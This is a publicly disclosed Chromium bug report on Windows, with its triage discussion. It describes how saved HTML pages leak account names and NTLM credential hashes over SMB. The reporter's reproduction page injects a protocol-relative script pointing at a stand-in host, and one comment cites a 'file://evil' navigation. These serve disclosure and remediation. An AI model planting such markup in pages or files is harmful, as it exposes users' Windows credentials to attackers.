# Security: Downloaded HTML can make requests over SMB, revealing Windows credential hashes

| Field | Value |
|-------|-------|
| **Issue ID** | [40090822](https://issues.chromium.org/issues/40090822) |
| **Status** | Accepted |
| **Severity** | S1-High |
| **Priority** | P3 |
| **Component** | Blink>SecurityFeature>SameOriginPolicy, Internals>Core, Internals>Network, Privacy |
| **Platforms** | Windows |
| **Reporter** | 29...@gmail.com |
| **Assignee** | ri...@chromium.org |
| **Created** | 2018-03-16 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

1. Visit site with malicious JavaScript.
2. Menu - More Tools - Save As - Webpage, Complete.
3. Open saved page (HTML) file in Google Chrome.
4. In TCPView/Wireshark observe connection to port 445 (SMB2 protocol). The following information is leaked to the malicious site/IP address:

- Windows version e.g. 6.1 (Build 7601)
- Windows account name e.g. Domain\Username
- Windows host/PC name e.g. Johns-PC
- NTLM Hashes, Challenges/responses...

No sure about NTLM, but my concern is leaking account name and PC name. Wanted to report as regular bug, but changed my mind. Seems like security issue to me. Feel free to classify as regular bug without any explanation :)

Also, note that I discovered this by analyzing suspicious traffic from some of my users that making many SMB connections to random IP addresses. If particular IP has 445 port open (e.g. Samba server) then info leak will occur.

**VERSION**  

Chrome Version:

- Version 65.0.3325.162 (Official Build) (64-bit)
- Version 67.0.3372.0 (Official Build) canary (64-bit)

Operating System: does no matter. Works on Windows 10 and Windows 7 fully patched. Windows 10 - version 1709 (OS Build 16299.309).

**REPRODUCTION CASE**

Example page that can be hosted on any website.

<!DOCTYPE html>
<html>
<body>
<script type="text/javascript">
s=document.createElement('script'),
s.src='//www.example.com/script.js';
m=document.getElementsByTagName('script')[0];
// insertBefore places script before this <script> block
// and strangely does not cause connection to port 445 !!!
// m.parentNode.insertBefore(s,m)
// so we use insertAfter
insertAfter(s,m)

function insertAfter(newNode, referenceNode) {  

referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);  

}  

</script>

</body></html>

## Timeline

### el...@chromium.org (2018-03-16)

This is fundamentally the same thing as https://crbug.com/chromium/819703. While Chrome doesn't allow resources not served from file:// to make requests to file://, if the file is downloaded first, it is permitted to make such requests.

Many firewalls and networks are configured to drop SMB hashes on egress traffic, but there are cases where this doesn't happen.

Note that even if this were mitigated via some means in Chrome, it would likely be easily circumvented by downloading a file type that opens in another handler (e.g. WMV, etc).



[Monorail components: Internals>Network>Auth]

### as...@chromium.org (2018-03-16)

This isn't HTTP auth though.

Not sure what to do here. Should we constrain file:// resources from making requests across host boundaries? Or block protocol relative URLs when the base URL is file:// ?

I'll remove Internals>Network>Auth in the meantime.

[Monorail components: -Internals>Network>Auth]

### el...@chromium.org (2018-03-16)

It's not HTTPAuth, for sure, but it seems odd to say that it isn't Network Auth.

### as...@chromium.org (2018-03-16)

#3: Agree.

But the Internals>Network>Auth component is specifically for HTTP auth in Chrome's network stack. I adjusted the component assignment so that this doesn't need to be triaged under that component.



### es...@chromium.org (2018-03-17)

asanka, do you have a suggested component for where this should live? Internals>Network?

### as...@chromium.org (2018-03-17)

Yeah, we could keep it in Internals>Network for now since one resolution may be to change how //net handles file:// URLs. Added there.

[Monorail components: Internals>Network]

### 29...@gmail.com (2018-03-17)

I forgot to mention one thing -- if you look in the TCPView or netstat, you see that connection to port 445 is done by SYSTEM, not the chrome.exe (at first I thought that some evil script escaped sandbox LOL). Not really a bug, but very confusing.

Also, "insertBefore" or "insertAfter" does not make any difference. Wrong conclusion from my side.


### el...@chromium.org (2018-05-01)

https://securify.nl/en/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html provides a nice summary of this issue overall.

### ts...@chromium.org (2018-05-03)

asanka - defaulting ownership to you. please re-assign as appropriate. Thanks.

### as...@chromium.org (2018-05-03)

I'm unsure what to do here.

If the downloaded HTML contained obfuscated file:// URLs then those will start working when the HTML file is downloaded. I can't see https://crbug.com/chromium/819703, but I imagine that might be what that issue is about.

We could consider constraining file:// resources requests to a "same directory or below" rule. That'll be consistent with how Chrome handles web page saving. I.e. it won't break HTML files saved by Chrome even when including iframes. However, it'll allow an HTML file to see/probe other HTML files that were saved to the same directory. In addition, this will break lots of use cases for HTML files stored on disk. E.g. generated documentation, large websites saved for offline use, etc.

A more modest restriction would be to restrict file:// URLs to same-authority, or disallow crossing local vs. remote boundary. That should address most of the concerns above, but I can imagine it breaking enterprises.

What should we do here?

### el...@chromium.org (2018-05-03)

Sadly, I don't think there are any particularly good answers here, which is why this problem is so common. When we fix this for HTML/SVG/etc files, attackers will simply download some other Windows file format that has the ability to embed URLs that will get pulled via SMB.

I think partitioning file:// loads such that local file loads aren't allowed to pull remote file:// uris is probably a reasonable balance between privacy and compatibility risk. We'd have to ensure that such protections couldn't be defeated by a HTTP response that redirects to a remote file:// Uri. 

However, this starts to get even more gnarly when we consider that this vector is also exploitable via navigations (e.g. even if we blocked subdownloads, an evil attacker could treat any click as a navigation to file://evil/whatever).

### 29...@gmail.com (2018-05-04)

I can share scenario from my organizations' point of view. And in this scenario I would separate issue into two separate issues.

1st happens when naive user uses Chrome built-in feature "Save page as", as described in the Google Chrome Help page: https://support.google.com/chrome/answer/7343019?co=GENIE.Platform%3DDesktop&hl=en

User just wants to read some page later or offline, and uses "Save page as" feature, and due to some JavaScripts, the page gets saved in the way, that it makes requests to SMB instead of HTTP. I would add some "flag" that prevents a such page from accessing SMB or even HTML by default. For example some meta tag in the page header, or some additional JavaScript snippet that disable SMB, etc. So in the result, naive user can safely save any rogue HTML page, and later using that page with file:// protocol it cannot cause any harm.

2nd issue when custom created HTML page using file:// protocol can access resources in the LAN is expected behavior and we also use a such scenario here. But this is not a security concern for us, because all such pages comes from trusted sources.

Again, most of our users are somewhat trained to not save (and run) random files from internet into HDD, like .exe, .dll, screen savers, etc. However, using Chrome built-in feature to save page for offline viewing should not cause any harm to the naive user. At least our users are not expecting this. So IMHO the only problem is "Save page as" feature, not the whole file://.... thing.

Just my two cents...

### el...@chromium.org (2018-05-04)

The best fix for an organization is to block outbound SMB at the firewall, as this is the only way to prevent credential hashes from leaking from the many applications on your computer that can send such hashes.

In Chrome, adjusting SavePageAs would probably be possible, but that doesn't address the more likely attack scenario, wherein the attacker site triggers the Download of a HTML file directly rather than hoping that the victim will invoke the SavePage command.  


### me...@chromium.org (2018-05-17)

[Empty comment from Monorail migration]

### ct...@chromium.org (2018-07-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### me...@chromium.org (2019-04-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-06)

[Empty comment from Monorail migration]

### jd...@chromium.org (2019-06-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### sl...@google.com (2019-08-21)

Tagging this in to Same Origin Policy as well, if we're going to either change the origin for File URLs or make them more restrictive and limit the cross-path loads. That's definitely something that would affect the Fetch spec ( https://fetch.spec.whatwg.org/ ) 

Also tagging this Internals>Core, because conceptually it affects the 'host' portion of file:// URLs, which is related to our URL parser. Recognizing "different hosts" as different origins and changing how file://-loaded resources load cross-origin bits would also help.

That said, I'm not sure if we should be treating this in the Security queue, for the reasons Eric mentions. There's a privacy dimension to this, for sure, but this relates to how systems load downloaded files, and so it's not a security issue from "Downloading files" perspective, and more of a privacy question in "Loading file:// URLs" (with explicit user action)

[Monorail components: Blink>SecurityFeature>SameOriginPolicy Internals>Core Privacy]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-11)

[Empty comment from Monorail migration]

### zh...@google.com (2021-03-17)

[Empty comment from Monorail migration]

### ad...@chromium.org (2022-11-22)

[Empty comment from Monorail migration]

### ad...@google.com (2023-02-16)

(auto-cc on security bug)

### ad...@google.com (2023-02-28)

(I am a bot: this is an auto-cc on a security bug)

### ad...@google.com (2023-02-28)

(I am a bot: this is an auto-cc on a security bug)

### an...@chromium.org (2023-11-19)

[Empty comment from Monorail migration]

### ch...@chromium.org (2023-12-15)

Removing asanka as they are no longer working on Chromium.

+bashi: Could you please take another look at this? Would you consider this a security bug?

### is...@google.com (2023-12-15)

This issue was migrated from crbug.com/chromium/822754?no_tracker_redirect=1

[Multiple monorail components: Blink>SecurityFeature>SameOriginPolicy, Internals>Core, Internals>Network, Privacy]
[Monorail mergedwith: crbug.com/chromium/1503469, crbug.com/chromium/844012, crbug.com/chromium/866277, crbug.com/chromium/954376, crbug.com/chromium/979520]
[Monorail components added to Component Tags custom field.]

### am...@chromium.org (2025-04-18)

temporarily closing this issue as fixed

### sp...@google.com (2025-04-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of lower impact user information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-04-18)

Thank you for this report back in 2018. We are going through some of our oldest bugs categorized as security bugs for potential reward and disclosure. Given the amount of time since this was reported to us and the lower potential for security consequences, we're going to go ahead and open this public visibility.

In parallel, we have also decided assess this from a Chrome VRP standpoint and have issued a reward at this time, despite it not yet being resolved. Thank you for your efforts in reporting this to us and your patience while this remains in our backlog.

### dr...@chromium.org (2025-06-16)

We do have a slightly different vector for download -> NTLM leak in <https://crbug.com/424764743>, for those interested. Feel free to contact me if you need access to the new security bug.

### ba...@chromium.org (2026-02-26)

I'm not very familiar with the issue. Let me unassign me.

### ri...@chromium.org (2026-02-26)

Apparently NTLM will be disabled by default in the next major Windows Server release: <https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526>

This will mitigate the issue.

We could potentially add extra restrictions for HTML files that have the Mark of the Web (<https://en.wikipedia.org/wiki/Mark_of_the_Web>), but this would inevitably break some existing workflows.

### li...@chromium.org (2026-02-27)

@ri...@chromium.org would it make sense to mark this bug as obsolete in that case?

### ri...@chromium.org (2026-03-02)

Maybe it's not obsolete until the very last NTLM server has been turned down?

It's certainly lower priority than it used to be. I propose reducing priority to P3 to reflect reduced impact and better availability of workarounds (ie. disable NTLM).

## Bounty Award

> report of lower impact user information disclosure

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090822)*
